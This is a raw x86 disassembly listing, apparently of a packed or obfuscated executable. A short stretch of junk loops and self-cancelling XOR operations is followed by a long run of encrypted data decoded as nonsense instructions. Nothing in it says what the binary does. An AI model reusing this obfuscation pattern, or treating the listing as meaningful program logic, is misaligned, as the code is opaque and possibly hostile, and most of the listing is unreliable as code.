  40ae3e:	mov    eax,DWORD PTR [ebp+0x8]
  40ae41:	add    eax,DWORD PTR [ebp+0xc]
  40ae44:	mov    DWORD PTR ds:0x437753,0x47ad
  40ae4e:	mov    DWORD PTR [ebp+0x8],eax
  40ae51:	jmp    0x40d295
  40ae56:	and    DWORD PTR ds:0x43777f,0x0
  40ae60:	jmp    0x40ae73
  40ae65:	xor    eax,eax
  40ae67:	xor    eax,DWORD PTR ds:0x43777f
  40ae6d:	inc    eax
  40ae6e:	mov    ds:0x43777f,eax
  40ae73:	cmp    DWORD PTR ds:0x43777f,0x17
  40ae7a:	jae    0x40aebd
  40ae80:	cmp    DWORD PTR ds:0x43777f,0x4
  40ae87:	ja     0x40aebd
  40ae8d:	jmp    0x40ae9d
  40ae92:	push   0x75c8
  40ae97:	call   DWORD PTR ds:0x43c998
  40ae9d:	cmp    DWORD PTR ds:0x43777f,0x3
  40aea4:	jne    0x40aeb8
  40aeaa:	xor    eax,eax
  40aeac:	xor    eax,DWORD PTR ds:0x43777f
  40aeb2:	inc    eax
  40aeb3:	mov    ds:0x43777f,eax
  40aeb8:	jmp    0x40ae65
  40aebd:	mov    eax,DWORD PTR [ebp-0x8]
  40aec0:	mov    eax,DWORD PTR [eax]
  40aec2:	xor    ecx,ecx
  40aec4:	sub    eax,0x5424137
  40aec9:	sbb    ecx,0x0
  40aecc:	xor    eax,0x8a29a14b
  40aed1:	xor    ecx,0x0
  40aed4:	xor    eax,0x8a29a14b
  40aed9:	xor    ecx,0x0
  40aedc:	jmp    0x40d22a
  40aee1:	adc    DWORD PTR [edi+0x72f722e7],0x46
  40aee8:	ss hlt 
  40aeea:	icebp  
  40aeeb:	xchg   DWORD PTR [esp+ecx*8+0x3f1d7a26],eax
  40aef2:	pop    es
  40aef3:	jnp    0x40af70
  40aef5:	stos   BYTE PTR es:[edi],al
  40aef6:	cwde   
  40aef7:	jnp    0x40af74
  40aef9:	rcl    ecx,1
  40aefb:	jmp    0xd80982c2
  40af00:	in     al,dx
  40af01:	shl    BYTE PTR [edx-0x312e0e41],1
  40af07:	into   
  40af08:	in     eax,dx
  40af09:	shl    edi,0x5
  40af0c:	xlat   BYTE PTR ds:[ebx]
  40af0d:	or     eax,edx
  40af0f:	jecxz  0x40aef3
  40af11:	leave  
  40af12:	(bad)
  40af15:	mov    cl,0xc1
  40af17:	scas   eax,DWORD PTR es:[edi]
  40af18:	int3   
  40af19:	cmc    
  40af1a:	int    0xce
  40af1c:	repnz xlat BYTE PTR ds:[ebx]
  40af1e:	(bad)  
  40af20:	fcmovnu st,st(4)
  40af22:	hlt    
  40af23:	icebp  
  40af24:	rol    edx,cl
  40af26:	stc    
  40af27:	stc    
  40af28:	shl    dl,0xe4
  40af2b:	(bad)
  40af2e:	aad    0xf9
  40af30:	leave  
  40af31:	loopne 0x40af38
  40af33:	fsubr  st,st(4)
  40af35:	mov    eax,0xeecdeef3
  40af3b:	in     eax,dx
  40af3c:	(bad)  
  40af3d:	mov    cl,0xef
  40af3f:	ror    ebx,cl
  40af41:	shl    dh,cl
  40af43:	repnz mov edi,0xf1dbeebd
  40af49:	mov    esi,0x8c0c0e2
  40af4f:	fmul   QWORD PTR [edi]
  40af51:	iret   
  40af52:	inc    BYTE PTR [edx]
  40af54:	cld    
  40af55:	out    dx,eax
  40af56:	xlat   BYTE PTR ds:[ebx]
  40af57:	test   ch,0xf0
  40af5a:	loope  0x40af10
  40af5c:	mov    bl,0xd9
  40af5e:	fucomip st,st(7)
  40af60:	in     al,dx
  40af61:	(bad)  
  40af62:	fdivr  st(6),st
  40af64:	out    dx,eax
  40af65:	lock xlat BYTE PTR ds:[ebx]
  40af67:	std    
  40af68:	fsub   st,st(6)
  40af6a:	add    bh,dl
  40af6c:	rcr    edx,0xcb
  40af6f:	(bad)  
  40af70:	retf   0xf8e6
  40af73:	add    BYTE PTR [esi],al
  40af75:	sar    DWORD PTR [eax-0x4c12230e],cl
  40af7b:	sti    
  40af7c:	retf   0xcbb2
  40af7f:	(bad)  
  40af80:	repz sar bl,cl
  40af83:	fmul   st,st(6)
  40af85:	sti    
  40af86:	fld    st(2)
  40af88:	cli    
  40af89:	jmp    eax
  40af8b:	cld    
  40af8c:	clc    
  40af8d:	loope  0x40af72
  40af8f:	loop   0x40af9b
  40af91:	aad    0xe2
  40af93:	loopne 0x40af95
  40af95:	(bad)  
  40af96:	in     eax,dx
  40af97:	in     al,dx
  40af98:	scas   eax,DWORD PTR es:[edi]
  40af99:	rcl    cl,cl
  40af9b:	test   ch,0xcf
  40af9e:	enter  0xbff3,0xb9
  40afa2:	out    dx,eax
  40afa3:	mov    cl,0xe9
  40afa5:	fdivr  st(3),st
  40afa7:	lock clc 
  40afa9:	sar    esp,cl
  40afab:	clc    
  40afac:	jmp    0x9:0xf6fde9e4
  40afb3:	add    eax,0xf2bfcfd8
  40afb8:	fadd   st(4),st
  40afba:	in     al,0xc0
  40afbc:	enter  0xaece,0xb0
  40afc0:	stc    
  40afc1:	leave  
  40afc2:	out    dx,al
  40afc3:	mov    eax,0xf1c3dcd1
  40afc8:	out    0x2,eax
  40afca:	fld    DWORD PTR [edx]
  40afcc:	ror    DWORD PTR [ecx],0xd4
  40afcf:	retf   0xfbca
  40afd2:	out    dx,eax
  40afd3:	out    dx,al
  40afd4:	in     eax,0xaa
  40afd6:	in     eax,dx
  40afd7:	scas   al,BYTE PTR es:[edi]
  40afd8:	lods   al,BYTE PTR ds:[esi]
  40afd9:	fdiv   QWORD PTR [ebp-0x71a3038]
  40afdf:	mov    edi,0xecf5d9dd
  40afe4:	sti    
  40afe5:	iret   
  40afe6:	mov    esp,0xf0dbd2d0
  40afeb:	cli    
  40afec:	or     edi,eax
  40afee:	jmp    0xe54098fd
  40aff3:	into   
  40aff4:	out    dx,al
  40aff5:	repnz jmp 0xdbee:0xf3b1b7c4
  40affd:	(bad)  
  40affe:	jmp    0xfd2c7ad0
  40b003:	fnstsw WORD PTR [esi-0x4b26462f]
  40b009:	(bad)  
  40b00a:	out    0xd3,eax
  40b00c:	repnz (bad) 
  40b00e:	or     ah,ah
  40b010:	(bad)  
  40b011:	fcmovnu st,st(3)
  40b013:	jmp    0x40afe0
  40b015:	loopne 0x40afc5
  40b017:	not    ecx
  40b019:	loopne 0x40afdf
  40b01b:	into   
  40b01c:	int    0xb3
  40b01e:	(bad)  
  40b01f:	out    0xf8,eax
  40b021:	mov    eax,0xbaf4d6f1
  40b026:	fld    DWORD PTR [eax]
  40b028:	into   
  40b029:	add    al,0xc6
  40b02b:	out    0xa,eax
  40b02d:	ffree  st(7)
  40b02f:	mov    ebp,0xe7eaeb05
  40b034:	shl    ebx,cl
  40b036:	call   0xc2ed6d28
  40b03b:	retf   
  40b03c:	lods   al,BYTE PTR ds:[esi]
  40b03d:	shl    BYTE PTR [ebp-0x40224a10],1
  40b043:	test   bl,0xd0
  40b046:	fidiv  DWORD PTR [ebp-0x8fd442a]
  40b04c:	pop    es
  40b04d:	fcmovnb st,st(6)
  40b04f:	out    dx,al
  40b050:	jecxz  0x40b01f
  40b052:	or     al,0xf3
  40b054:	jmp    0xfbf2:0xdeadd2e8
  40b05b:	test   eax,0xe7e7d2f4
  40b060:	int3   
  40b061:	mov    ah,0xcb
  40b063:	imul   esp
  40b065:	cli    
  40b066:	(bad)  
  40b068:	(bad)  
  40b069:	ret    0xddc6
  40b06c:	jmp    0x40b035
  40b06e:	(bad)  
  40b070:	add    al,0x1
  40b072:	pop    es
  40b073:	add    dl,dl
  40b075:	loop   0x40b02a
  40b077:	shl    BYTE PTR [esi-0xc3f1b33],1
  40b07d:	sti    
  40b07e:	mov    bh,0xe4
  40b080:	aad    0xf3
  40b082:	sti    
  40b083:	stc    
  40b084:	shr    esp,1
  40b086:	repz icebp 
  40b088:	out    0xcc,al
  40b08a:	rol    al,0xe0
  40b08d:	cld    
  40b08e:	add    dl,bl
  40b090:	xabort 0xfe
  40b093:	jmp    0xecbe:0xafdfcdf3
  40b09a:	loop   0x40b070
  40b09c:	(bad)  
  40b09d:	jmp    0x40b053
  40b09f:	rcl    edi,cl
  40b0a1:	hlt    
  40b0a2:	out    dx,al
  40b0a3:	mov    ebp,0xdcf4fbf6
  40b0a8:	loop   0x40b089
  40b0aa:	add    eax,ecx
  40b0ac:	(bad)  
  40b0ae:	neg    bh
  40b0b0:	lds    eax,FWORD PTR [edx]
  40b0b2:	adc    eax,DWORD PTR [esi]
  40b0b4:	std    
  40b0b5:	repnz loopne 0x40b094
  40b0b8:	iret   
  40b0b9:	scas   eax,DWORD PTR es:[edi]
  40b0ba:	mov    bl,0xe6
  40b0bc:	test   al,0xb5
  40b0be:	iret   
  40b0bf:	retf   
  40b0c0:	mov    eax,0xd6ceebec
  40b0c5:	out    dx,eax
  40b0c6:	mov    dh,0xdf
  40b0c8:	fcomp  st(4)
  40b0ca:	add    esp,esi
  40b0cc:	icebp  
  40b0cd:	add    eax,0xfcf5cbd8
  40b0d2:	or     cl,bh
  40b0d4:	adc    edx,esp
  40b0d6:	scas   eax,DWORD PTR es:[edi]
  40b0d7:	jmp    0xb9e8:0xe4b7acc1
  40b0de:	imul   eax
  40b0e0:	out    dx,al
  40b0e1:	(bad)  
  40b0e2:	(bad)  
  40b0e3:	(bad)  
  40b0e5:	shl    ah,1
  40b0e7:	push   es
  40b0e8:	xlat   BYTE PTR ds:[ebx]
  40b0e9:	pop    es
  40b0ea:	aad    0xd4
  40b0ec:	fild   WORD PTR [eax]
  40b0ee:	clc    
  40b0ef:	jecxz  0x40b0f5
  40b0f1:	(bad)  
  40b0f2:	jecxz  0x40b107
  40b0f4:	add    al,ch
  40b0f6:	mov    eax,0xb1ccd5d0
  40b0fb:	iret   
  40b0fc:	jmp    0xd7bf:0xd5edd8b5
  40b103:	call   0xd41c87e7
  40b108:	fmul   st,st(5)
  40b10a:	sar    BYTE PTR [ecx-0x381f2900],cl
  40b110:	(bad)  
  40b111:	std    
  40b112:	std    
  40b113:	out    0xfd,al
  40b115:	lods   al,BYTE PTR ds:[esi]
  40b116:	loop   0x40b104
  40b118:	mov    dl,0xef
  40b11a:	ret    
  40b11b:	ret    0xd5eb
  40b11e:	icebp  
  40b11f:	enter  0xd9f7,0xc8
  40b123:	call   0xdcf76ce2
  40b128:	mov    ebp,0xc6d8c0c5
  40b12d:	rol    BYTE PTR [edx+ecx*1],0x3
  40b131:	(bad)  
  40b132:	aam    0x1
  40b134:	dec    eax
  40b136:	mov    cl,0xc8
  40b138:	mov    al,0xd2
  40b13a:	out    dx,al
  40b13b:	(bad)  
  40b13c:	jmp    0xdad6:0xc9edc8ba
  40b143:	stc    
  40b144:	hlt    
  40b145:	mov    ecx,0xfaf2d2ba
  40b14a:	les    eax,FWORD PTR [ecx]
  40b14c:	pop    es
  40b14d:	out    0xf7,al
  40b14f:	aad    0xdc
  40b151:	clc    
  40b152:	fucomp st(7)
  40b154:	fld1   
  40b156:	loopne 0x40b10f
  40b158:	out    0xec,eax
  40b15a:	mov    dh,0xad
  40b15c:	leave  
  40b15d:	aam    0xda
  40b15f:	(bad)  
  40b160:	fucomi st,st(4)
  40b162:	cmc    
  40b163:	icebp  
  40b164:	add    esi,edx
  40b166:	aam    0xdc
  40b168:	fadd   st,st(7)
  40b16a:	(bad)  
  40b16c:	hlt    
  40b16d:	retf   
  40b16e:	xlat   BYTE PTR ds:[ebx]
  40b16f:	aam    0xfb
  40b171:	(bad)  
  40b172:	or     ah,ah
  40b174:	loopne 0x40b156
  40b176:	leave  
  40b177:	(bad)  
  40b178:	(bad)
  40b17b:	in     eax,dx
  40b17c:	retf   
  40b17d:	shr    edx,1
  40b17f:	call   0xfb3d7673
  40b184:	into   
  40b185:	iret   
  40b186:	fnstsw WORD PTR [eax-0x3b1b092f]
  40b18c:	mov    esp,0xe6dcd7c7
  40b191:	jecxz  0x40b16d
  40b193:	int    0xef
  40b195:	out    dx,eax
  40b196:	test   al,0xaf
  40b198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b199:	(bad)  
  40b19a:	mov    ah,0xc4
  40b19c:	retf   
  40b19d:	(bad)  
  40b19f:	cli    
  40b1a0:	jmp    0x40b15a
  40b1a2:	mov    esp,0xf8bdcff8
  40b1a7:	rcl    esp,0x5
  40b1aa:	icebp  
  40b1ab:	aad    0xdf
  40b1ad:	jmp    0xfc01:0x600c804
  40b1b4:	fucomip st,st(2)
  40b1b6:	scas   eax,DWORD PTR es:[edi]
  40b1b7:	iret   
  40b1b8:	(bad)  
  40b1b9:	div    esi
  40b1bb:	mov    ah,0xc7
  40b1bd:	repz shl bl,cl
  40b1c0:	int    0xba
  40b1c2:	clc    
  40b1c3:	ror    ebp,cl
  40b1c5:	(bad)  
  40b1c6:	loope  0x40b19a
  40b1c8:	aam    0xd6
  40b1ca:	dec    BYTE PTR [edx]
  40b1cc:	sar    bl,cl
  40b1ce:	call   0xca4286d7
  40b1d3:	(bad)  
  40b1d5:	out    0xe2,eax
  40b1d7:	jecxz  0x40b1c2
  40b1d9:	aam    0xb1
  40b1db:	rcl    ch,1
  40b1dd:	call   0xf3fa5fcf
  40b1e2:	(bad)  
  40b1e3:	fyl2xp1 
  40b1e5:	imul   ah
  40b1e7:	out    dx,al
  40b1e8:	int    0xd7
  40b1ea:	(bad)
  40b1ee:	(bad)  
  40b1ef:	loopne 0x40b1ea
  40b1f1:	into   
  40b1f2:	hlt    
  40b1f3:	enter  0xdd06,0xbe
  40b1f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1f8:	loope  0x40b1c3
  40b1fa:	scas   al,BYTE PTR es:[edi]
  40b1fb:	bnd jmp 0xe9f16bc9
  40b201:	vpmullw xmm5,xmm6,xmm7
  40b205:	fsubrp st(7),st
  40b207:	out    dx,eax
  40b208:	aad    0xdd
  40b20a:	clc    
  40b20b:	or     al,BYTE PTR ds:0xf806dbf7
  40b211:	call   0xc3457bfd
  40b216:	in     eax,0xcb
  40b218:	mov    al,0xb5
  40b21a:	enter  0xe8bb,0xe4
  40b21e:	hlt    
  40b21f:	jmp    0xfd009de3
  40b224:	retf   0xec
  40b227:	jecxz  0x40b1e7
  40b229:	clc    
  40b22a:	mov    esi,0xdbe0cac5
  40b22f:	sar    al,0xea
  40b232:	(bad)
  40b235:	retf   
  40b236:	jmp    0xd2c9:0xcbbcdce4
  40b23d:	(bad)  
  40b23e:	div    al
  40b240:	cli    
  40b241:	lock mov ecx,0xeef6c3d1
  40b247:	jecxz  0x40b24c
  40b249:	push   es
  40b24a:	loop   0x40b22e
  40b24c:	out    0xf4,eax
  40b24e:	jmp    0x40b23f
  40b250:	test   BYTE PTR ds:0xb8c0dff4,0xbf
  40b257:	repz ror ch,0xb2
  40b25b:	(bad)  
  40b25c:	(bad)  
  40b25d:	fcmove st,st(6)
  40b25f:	hlt    
  40b260:	jmp    0xfe0d7b37
  40b265:	add    edi,esp
  40b267:	mov    ch,0xc6
  40b269:	push   es
  40b26a:	xlat   BYTE PTR ds:[ebx]
  40b26b:	jmp    0xfefa:0xdeeae3d0
  40b272:	les    edx,FWORD PTR [edx]
  40b274:	or     ebx,ebp
  40b276:	mov    eax,0xeaafe5ce
  40b27b:	test   eax,0xd8d1afce
  40b280:	fnop   
  40b282:	aam    0xf5
  40b284:	cli    
  40b285:	into   
  40b286:	rol    BYTE PTR [ebx],0xf5
  40b289:	fadd   QWORD PTR [eax]
  40b28b:	jmp    0xfdcb:0xe7d8c1ca
  40b292:	retf   0xdcdf
  40b295:	jmp    0xc9d7:0xd0e1d1ad
  40b29c:	loopne 0x40b25f
  40b29e:	mov    ebx,0xe4cef4f9
  40b2a3:	retf   
  40b2a4:	mov    ebp,0xbdb9ddd8
  40b2a9:	pop    es
  40b2aa:	cmc    
  40b2ab:	loopne 0x40b2a3
  40b2ad:	cld    
  40b2ae:	call   0xdf48ab88
  40b2b3:	cli    
  40b2b4:	out    0xd0,al
  40b2b6:	loope  0x40b294
  40b2b8:	cmc    
  40b2b9:	int    0xc9
  40b2bb:	in     al,dx
  40b2bc:	stc    
  40b2bd:	lock retf 
  40b2bf:	mov    al,0xb4
  40b2c1:	mov    bh,0xe8
  40b2c3:	in     al,dx
  40b2c4:	clc    
  40b2c5:	fmulp  st(6),st
  40b2c7:	rol    DWORD PTR [eax],1
  40b2c9:	add    ecx,edi
  40b2cb:	ret    
  40b2cc:	fmulp  st(2),st
  40b2ce:	jmp    0x40b2b9
  40b2d0:	add    esp,edx
  40b2d2:	add    al,bh
  40b2d4:	icebp  
  40b2d5:	in     al,0xef
  40b2d7:	shr    DWORD PTR [esi-0x4b3b4f1a],0xf3
  40b2de:	fld    TBYTE PTR [ebp-0x4e242a0d]
  40b2e4:	call   0xd71b9bb5
  40b2e9:	aad    0xde
  40b2eb:	aam    0xf2
  40b2ed:	jmp    0xe7109ad4
  40b2f2:	(bad)  
  40b2f3:	repz push es
  40b2f5:	enter  0xbcbe,0xf2
  40b2f9:	imul   DWORD PTR [edx-0x24303218]
  40b2ff:	out    dx,eax
  40b300:	mov    esi,0xe2e9f4bb
  40b305:	enter  0x3cd,0xe2
  40b309:	xlat   BYTE PTR ds:[ebx]
  40b30a:	out    0xeb,al
  40b30c:	fdiv   st,st(1)
  40b30e:	fucomp st(7)
  40b310:	iret   
  40b311:	int    0xd4
  40b313:	clc    
  40b314:	in     eax,dx
  40b315:	(bad)  
  40b316:	mov    edi,0xcae5d1d3
  40b31b:	(bad)  
  40b31c:	mov    ah,0xe4
  40b31e:	leave  
  40b31f:	retf   0xdbee
  40b322:	cmc    
  40b323:	mov    ebx,0xd0dcf0d7
  40b328:	int    0xcc
  40b32a:	add    ebp,edi
  40b32c:	(bad)  
  40b32e:	or     ebp,eax
  40b330:	(bad)  
  40b331:	fcmovne st,st(4)
  40b333:	push   es
  40b334:	loop   0x40b319
  40b336:	test   eax,0xc5d3f0b7
  40b33b:	cmc    
  40b33c:	mov    ah,0xda
  40b33e:	mov    eax,0xd3b3b8b1
  40b343:	jmp    0xffdf:0xd9fcdfed
  40b34a:	in     eax,0xf1
  40b34c:	loop   0x40b359
  40b34e:	aam    0x5
  40b350:	leave  
  40b351:	(bad)  
  40b353:	or     eax,0xc1c4bede
  40b358:	out    0xf4,al
  40b35a:	stos   BYTE PTR es:[edi],al
  40b35b:	ret    
  40b35c:	stc    
  40b35d:	sti    
  40b35e:	cmc    
  40b35f:	mov    ebx,0xd1d6eadf
  40b364:	aad    0xd7
  40b366:	icebp  
  40b367:	in     eax,dx
  40b368:	idiv   edx
  40b36a:	(bad)  
  40b36b:	(bad)  
  40b36d:	cmc    
  40b36e:	fcmovb st,st(4)
  40b370:	in     eax,0xd
  40b372:	out    0xd3,eax
  40b374:	rcr    ah,0xe4
  40b377:	(bad)  
  40b378:	cmc    
  40b379:	rcl    esp,0xbb
  40b37c:	mov    dh,0xb9
  40b37e:	fdiv   DWORD PTR [ebp-0xd092737]
  40b384:	mov    esp,0xc3eee8d4
  40b389:	aad    0xc5
  40b38b:	(bad)
  40b38e:	test   BYTE PTR [esi],0xfb
  40b391:	jmp    0xe7e7:0xa7090ef3
  40b398:	jmp    0x40b367
  40b39a:	(bad)  [eax-0x19261120]
  40b3a0:	lods   al,BYTE PTR ds:[esi]
  40b3a1:	aad    0xcc
  40b3a3:	cli    
  40b3a4:	in     al,dx
  40b3a5:	sar    BYTE PTR [edx+0xbd8ddf3],1
  40b3ab:	(bad)  
  40b3ac:	loop   0x40b372
  40b3ae:	cmc    
  40b3af:	(bad)  
  40b3b2:	out    dx,al
  40b3b3:	jecxz  0x40b384
  40b3b5:	(bad)
  40b3b8:	ret    0xccd7
  40b3bb:	xlat   BYTE PTR ds:[ebx]
  40b3bc:	in     al,0xd0
  40b3be:	mov    dh,0xee
  40b3c0:	ror    ebx,cl
  40b3c2:	(bad)  
  40b3c3:	std    
  40b3c4:	mov    al,0xf6
  40b3c6:	clc    
  40b3c7:	pop    es
  40b3c8:	pop    es
  40b3c9:	mov    BYTE PTR [edx+ebp*8],0xe2
  40b3cd:	in     eax,0xe6
  40b3cf:	cld    
  40b3d0:	add    al,cl
  40b3d2:	out    dx,al
  40b3d3:	jmp    0x40b3b6
  40b3d5:	lods   eax,DWORD PTR ds:[esi]
  40b3d6:	lock ror dl,1
  40b3d9:	in     al,0xee
  40b3db:	xlat   BYTE PTR ds:[ebx]
  40b3dc:	in     al,dx
  40b3dd:	mov    al,0xf8
  40b3df:	test   bl,0xf2
  40b3e2:	add    edi,edx
  40b3e4:	ret    
  40b3e5:	fdiv   st(7),st
  40b3e7:	aad    0xbc
  40b3e9:	push   es
  40b3ea:	fnsetpm(287 only) 
  40b3ec:	cmc    
  40b3ed:	or     dh,dh
  40b3ef:	cld    
  40b3f0:	or     ah,al
  40b3f2:	(bad)
  40b3f5:	lods   al,BYTE PTR ds:[esi]
  40b3f6:	loopne 0x40b3d9
  40b3f8:	scas   eax,DWORD PTR es:[edi]
  40b3f9:	mov    bl,0xf4
  40b3fb:	lods   eax,DWORD PTR ds:[esi]
  40b3fc:	leave  
  40b3fd:	mov    ecx,0xb3e8fad1
  40b402:	stc    
  40b403:	sti    
  40b404:	(bad)  
  40b405:	call   0xf30095c6
  40b40a:	in     al,dx
  40b40b:	in     eax,0xdc
  40b40d:	rol    BYTE PTR [edi+eiz*8],0xee
  40b411:	or     ecx,edi
  40b413:	out    dx,al
  40b414:	icebp  
  40b415:	(bad)  
  40b416:	rol    edx,1
  40b418:	icebp  
  40b419:	jmp    0xf0c5:0xc1b0c4e4
  40b420:	(bad)  
  40b421:	in     al,dx
  40b422:	std    
  40b423:	int3   
  40b424:	jmp    0x3fe9c22
  40b429:	stc    
  40b42a:	std    
  40b42b:	(bad)
  40b42e:	xlat   BYTE PTR ds:[ebx]
  40b42f:	add    ecx,DWORD PTR [eax]
  40b431:	fdiv   st,st(3)
  40b433:	pop    es
  40b434:	or     al,cl
  40b436:	ffreep st(4)
  40b438:	jmp    0xdacf:0xbbbbb0f7
  40b43f:	mov    ah,0xb4
  40b441:	fdivr  st(5),st
  40b443:	mov    eax,0xceffcff9
  40b448:	add    eax,0xc4cbc4d9
  40b44d:	add    esp,ebx
  40b44f:	aam    0xfb
  40b451:	out    dx,eax
  40b452:	out    dx,eax
  40b453:	clc    
  40b454:	call   0xd60b9c08
  40b459:	hlt    
  40b45a:	cmc    
  40b45b:	repz loopne 0x40b439
  40b45e:	call   eax
  40b460:	mov    bh,0xfc
  40b462:	rcr    eax,cl
  40b464:	(bad)  
  40b466:	neg    esp
  40b468:	repz (bad) 
  40b46a:	mov    esp,0xe6dcfffa
  40b46f:	jmp    0xc0eb:0xd3e40106
  40b476:	jecxz  0x40b457
  40b478:	(bad)  
  40b479:	ror    edi,1
  40b47b:	int    0xc9
  40b47d:	in     eax,dx
  40b47e:	jmp    0xd8e2:0xe4ceb0e6
  40b485:	repnz fsub st(6),st
  40b488:	std    
  40b489:	clc    
  40b48a:	mov    esp,0xf5e303fe
  40b48f:	pavgw  mm1,mm5
  40b492:	out    dx,eax
  40b493:	in     eax,0xd9
  40b495:	iret   
  40b496:	scas   eax,DWORD PTR es:[edi]
  40b497:	retf   0xb1ad
  40b49a:	lock into 
  40b49c:	les    edi,FWORD PTR [ecx-0x36072f4a]
  40b4a2:	call   0xe915a591
  40b4a7:	clc    
  40b4a8:	rol    DWORD PTR [eax+edi*8],1
  40b4ab:	cld    
  40b4ac:	in     eax,0xf8
  40b4ae:	(bad)
  40b4b1:	loope  0x40b48d
  40b4b3:	adc    edx,ebx
  40b4b5:	(bad)  
  40b4b6:	icebp  
  40b4b7:	repz fucom st(6)
  40b4ba:	in     eax,0xb5
  40b4bc:	loop   0x40b47e
  40b4be:	repz jmp 0x40b4bb
  40b4c1:	fdiv   st,st(4)
  40b4c3:	dec    dl
  40b4c5:	mov    edx,0xd2e2d1d7
  40b4ca:	aad    0xb9
  40b4cc:	rcr    ebp,0x0
  40b4cf:	(bad)  
  40b4d0:	mul    bl
  40b4d2:	fcom   DWORD PTR [ebx]
  40b4d4:	in     eax,dx
  40b4d5:	out    0xa6,al
  40b4d7:	in     al,dx
  40b4d8:	shr    eax,0xdb
  40b4db:	(bad)  
  40b4dc:	in     eax,dx
  40b4dd:	mov    bh,0xd8
  40b4df:	(bad)  
  40b4e0:	aam    0xf0
  40b4e2:	fsub   st(4),st
  40b4e4:	out    dx,al
  40b4e5:	shl    ebp,0xbf
  40b4e8:	ret    
  40b4e9:	(bad)  
  40b4ea:	shl    ch,0xb8
  40b4ed:	(bad)  
  40b4ee:	out    dx,eax
  40b4ef:	add    bh,bh
  40b4f1:	add    esp,eax
  40b4f3:	in     eax,0xd9
  40b4f5:	ffree  st(6)
  40b4f7:	mov    esi,0xecc8f4ac
  40b4fc:	iret   
  40b4fd:	fstp   TBYTE PTR [eax-0x26243913]
  40b503:	(bad)  
  40b504:	cli    
  40b505:	loop   0x40b4fb
  40b507:	out    dx,al
  40b508:	xlat   BYTE PTR ds:[ebx]
  40b509:	mov    ebx,0xe9ebcbf4
  40b50e:	add    edx,edi
  40b510:	fld1   
  40b512:	frndint 
  40b514:	add    ch,ch
  40b516:	shr    ah,1
  40b518:	out    0xf5,al
  40b51a:	jmp    0xd51566da
  40b51f:	mov    edi,0xbdd3ddeb
  40b524:	in     eax,dx
  40b525:	ror    dh,1
  40b527:	aad    0xdd
  40b529:	out    0xf6,eax
  40b52b:	fsub   st,st(0)
  40b52d:	fsubr  st(3),st
  40b52f:	out    dx,al
  40b530:	loop   0x40b511
  40b532:	(bad)  
  40b535:	lods   eax,DWORD PTR ds:[esi]
  40b536:	(bad)
  40b539:	rol    cl,1
  40b53b:	mov    ch,0xac
  40b53d:	mov    bh,0xd0
  40b540:	aad    0xb6
  40b542:	call   0x1159029
  40b547:	loop   0x40b54b
  40b549:	fiadd  WORD PTR [ecx]
  40b54b:	add    BYTE PTR [edx],cl
  40b54d:	loop   0x40b514
  40b54f:	aam    0x5
  40b551:	jmp    0xce40993f
  40b556:	iret   
  40b557:	mul    BYTE PTR [esp+ecx*8-0x1b263c30]
  40b55e:	stc    
  40b55f:	fnstcw WORD PTR [ecx-0x9144b17]
  40b565:	call   0xd631836d
  40b56a:	lock icebp 
  40b56c:	jmp    0xfc19be4c
  40b571:	in     eax,dx
  40b572:	enter  0xceb,0xbf
  40b576:	enter  0xdeaf,0xb6
  40b57a:	icebp  
  40b57b:	cli    
  40b57c:	retf   
  40b57d:	stc    
  40b57e:	rcr    al,cl
  40b580:	retf   0xb6f8
  40b583:	retf   0xf9f1
  40b586:	add    edx,edi
  40b588:	out    0xd3,al
  40b58a:	shl    dl,cl
  40b58c:	jmp    0xf5259f51
  40b591:	loope  0x40b59c
  40b593:	cli    
  40b594:	adc    ebx,edx
  40b596:	out    dx,eax
  40b597:	mov    ebp,0xc5f2d5bc
  40b59c:	(bad)  
  40b59d:	retf   
  40b59e:	shl    ebp,cl
  40b5a0:	out    dx,al
  40b5a1:	retf   
  40b5a2:	mov    ah,0xb8
  40b5a4:	mov    ah,0xda
  40b5a6:	icebp  
  40b5a7:	jecxz  0x40b5b0
  40b5a9:	call   edx
  40b5ab:	fmul   QWORD PTR [edx]
  40b5ad:	fdivrp st(5),st
  40b5af:	cli    
  40b5b0:	fcmove st,st(5)
  40b5b2:	(bad)  
  40b5b3:	or     eax,0xc9e7b20e
  40b5b8:	fmul   st(7),st
  40b5ba:	ror    edx,1
  40b5bc:	repnz mov ecx,0xb4f2d0ba
  40b5c2:	aam    0x2
  40b5c4:	mov    eax,0xdac301d1
  40b5c9:	cli    
  40b5ca:	in     al,0x1
  40b5cc:	in     al,0x8
  40b5ce:	cmc    
  40b5cf:	test   dl,0xfc
  40b5d2:	jmp    0xa8ea:0xeed8e005
  40b5d9:	jmp    0x40b5ae
  40b5db:	mov    bh,0xd6
  40b5dd:	jmp    0xd7d4:0xccc4bbf9
  40b5e4:	mov    eax,0x6dfdac2
  40b5e9:	mov    esi,0xe50705d1
  40b5ee:	(bad)  
  40b5ef:	enter  0xde0b,0x5
  40b5f3:	iret   
  40b5f4:	jmp    0xf6ff5fc2
  40b5f9:	xlat   BYTE PTR ds:[ebx]
  40b5fa:	stos   BYTE PTR es:[edi],al
  40b5fb:	sti    
  40b5fc:	mov    cl,0xe7
  40b5fe:	in     eax,0xfb
  40b600:	shl    edi,cl
  40b602:	mov    ch,0xb9
  40b604:	(bad)  
  40b606:	out    0x1,eax
  40b608:	add    eax,0xf8dd0be4
  40b60d:	dec    bl
  40b60f:	out    0xb,al
  40b611:	out    dx,eax
  40b612:	int    0xf3
  40b614:	loope  0x40b5ee
  40b616:	shr    DWORD PTR [ebp+ecx*8-0xa0f3750],1
  40b61d:	out    dx,eax
  40b61e:	(bad)  
  40b620:	dec    esp
  40b622:	call   0x1238bf6
  40b627:	add    ah,al
  40b629:	test   BYTE PTR [ecx],0xc7
  40b62c:	(bad)  
  40b62d:	(bad)  
  40b62f:	(bad)  
  40b630:	out    dx,al
  40b631:	fcomi  st,st(3)
  40b633:	paddw  mm7,QWORD PTR [eax-0x1a4e1c13]
  40b63a:	in     eax,dx
  40b63b:	xlat   BYTE PTR ds:[ebx]
  40b63c:	cli    
  40b63d:	jmp    0x40b612
  40b63f:	in     eax,0xbe
  40b641:	int3   
  40b642:	fnstcw WORD PTR [ebp-0x29044629]
  40b648:	icebp  
  40b649:	ret    
  40b64a:	or     edx,esp
  40b64c:	in     al,0x6
  40b64e:	pop    es
  40b64f:	out    dx,al
  40b650:	(bad)  
  40b651:	loope  0x40b61d
  40b653:	repz (bad)
  40b656:	int    0xc2
  40b658:	in     eax,dx
  40b659:	retf   
  40b65a:	repnz lock aad 0xe8
  40b65e:	sar    edi,cl
